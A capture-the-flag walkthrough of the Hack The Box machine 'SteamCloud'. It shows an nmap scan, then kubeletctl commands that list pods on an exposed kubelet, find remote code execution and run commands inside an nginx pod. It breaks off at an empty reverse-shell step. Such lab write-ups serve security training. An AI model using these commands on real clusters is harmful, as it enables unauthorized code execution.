# Box: SteamCloud
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A -v -p- -T4 10.129.96.167```

```
Nmap scan report for 10.129.96.167
Host is up (0.22s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.129.96.167, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Issuer: commonName=etcd-ca
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-02T11:12:00
| Not valid after:  2024-11-01T11:12:01
| MD5:   8f85:98f9:38da:0522:ba72:ad3c:036a:d28b
|_SHA-1: 282a:35da:ec1b:afc3:44aa:4120:d673:bad8:9245:f192
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
2380/tcp  open  ssl/etcd-server?
| tls-alpn: 
|_  h2
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.129.96.167, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Issuer: commonName=etcd-ca
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-02T11:12:00
| Not valid after:  2024-11-01T11:12:01
| MD5:   8100:4f1c:3914:7e81:e18f:ffea:ab4f:abfd
|_SHA-1: 39b1:0c4c:7362:dfc1:1358:bbd7:225b:9666:ce64:a534
|_ssl-date: TLS randomness does not represent time
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.129.96.167, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Issuer: commonName=minikubeCA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-01T11:11:59
| Not valid after:  2026-11-01T11:11:59
| MD5:   eadd:c6a5:1d3f:bf43:f4bf:5913:487d:514a
|_SHA-1: cdba:bac9:d6b9:be9d:61bf:b8f5:c2e2:36f9:7692:2030
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: a9e09a59-ac30-4ab1-92e3-897a8043ea58
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: c4cadbe0-e5a6-4afe-a828-f143b8ce81b0
|     X-Kubernetes-Pf-Prioritylevel-Uid: 8b56fae6-2ec4-49e0-bc6f-88866a0d7c81
|     Date: Thu, 02 Nov 2023 11:35:10 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: e65d1855-2abe-4304-a095-97d8f223da7d
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: c4cadbe0-e5a6-4afe-a828-f143b8ce81b0
|     X-Kubernetes-Pf-Prioritylevel-Uid: 8b56fae6-2ec4-49e0-bc6f-88866a0d7c81
|     Date: Thu, 02 Nov 2023 11:35:08 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 0dbaa305-f6d8-43d9-91b0-2a448b8906e0
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: c4cadbe0-e5a6-4afe-a828-f143b8ce81b0
|     X-Kubernetes-Pf-Prioritylevel-Uid: 8b56fae6-2ec4-49e0-bc6f-88866a0d7c81
|     Date: Thu, 02 Nov 2023 11:35:09 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| tls-alpn: 
|   h2
|_  http/1.1
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| ssl-cert: Subject: commonName=steamcloud@1698923523
| Subject Alternative Name: DNS:steamcloud
| Issuer: commonName=steamcloud-ca@1698923523
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-02T10:12:02
| Not valid after:  2024-11-01T10:12:02
| MD5:   2bf6:bcbc:d24a:fcca:5a7d:1eb7:f602:de4c
|_SHA-1: 21d1:7830:12dd:55c3:f805:d7d9:803d:2cd2:4a1b:befb
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_ssl-date: TLS randomness does not represent time
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=11/2%Time=6543896C%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20e65d1
SF:855-2abe-4304-a095-97d8f223da7d\r\nCache-Control:\x20no-cache,\x20priva
SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20c4cadbe0-e5a6-4afe-a828-f1
SF:43b8ce81b0\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x208b56fae6-2ec4-49e0-
SF:bc6f-88866a0d7c81\r\nDate:\x20Thu,\x2002\x20Nov\x202023\x2011:35:08\x20
SF:GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVersion\
SF:":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden
SF::\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/
SF:\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTTP
SF:Options,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x200dbaa305-f6d
SF:8-43d9-91b0-2a448b8906e0\r\nCache-Control:\x20no-cache,\x20private\r\nC
SF:ontent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nX-Kubernetes-Pf-Flowschema-Uid:\x20c4cadbe0-e5a6-4afe-a828-f143b8ce8
SF:1b0\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x208b56fae6-2ec4-49e0-bc6f-88
SF:866a0d7c81\r\nDate:\x20Thu,\x2002\x20Nov\x202023\x2011:35:09\x20GMT\r\n
SF:Content-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\
SF:",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20Us
SF:er\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"/\\\
SF:"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOhF
SF:ourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20a9e09a59-
SF:ac30-4ab1-92e3-897a8043ea58\r\nCache-Control:\x20no-cache,\x20private\r
SF:\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20c4cadbe0-e5a6-4afe-a828-f143b8
SF:ce81b0\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x208b56fae6-2ec4-49e0-bc6f
SF:-88866a0d7c81\r\nDate:\x20Thu,\x2002\x20Nov\x202023\x2011:35:10\x20GMT\
SF:r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"
SF:v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x2
SF:0User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice
SF:\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\"
SF::{},\"code\":403}\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=11/2%OT=22%CT=1%CU=41065%PV=Y%DS=2%DC=T%G=Y%TM=654389F
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:02%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%
OS:II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11N
OS:W7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE8
OS:8%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40
OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
OS:DFI=N%T=40%CD=S)

Uptime guess: 45.373 days (since Mon Sep 18 03:40:26 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   280.22 ms 10.10.14.1
2   280.19 ms 10.129.96.167

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov  2 12:37:21 2023 -- 1 IP address (1 host up) scanned in 1358.40 seconds
```
From our nmap scan, we have quite a number of open ports, we'll start our enumeration today with port 10250



# Enumeration (Port 10250)

We know that kubelet is listening on this port, we can use a tool ```kubeletctl``` to find out the number of pods on the server.

You can download the tool from [here](https://github.com/cyberark/kubeletctl/releases)

command:```./kubeletctl pods --server 10.129.96.167```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/13dc5de5-35a3-4055-aaf3-27c768d27f76)

We have 8 pods on the server

We can use this tool to scan for rce on this server

command:```./kubeletctl scan rce --server 10.129.96.167```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8efd7fc1-ff5e-47eb-99d3-c58ba7fdb5ba)

We can see that the pod ```nginx``` allows remote code execution (rce), lets exploit this



# Exploitation

We can run ```ls /``` command on pod ```nginx``` in thedefault ```namespace```

command:```./kubeletctl run "ls /" --namespace default --pod nginx --container nginx --server 10.129.96.167```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/steamcloud]
└─$ ./kubeletctl run "ls /" --namespace default --pod nginx --container nginx --server 10.129.96.167 
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
nice nice, lets try to spawn a reverse shell with this

command:```




























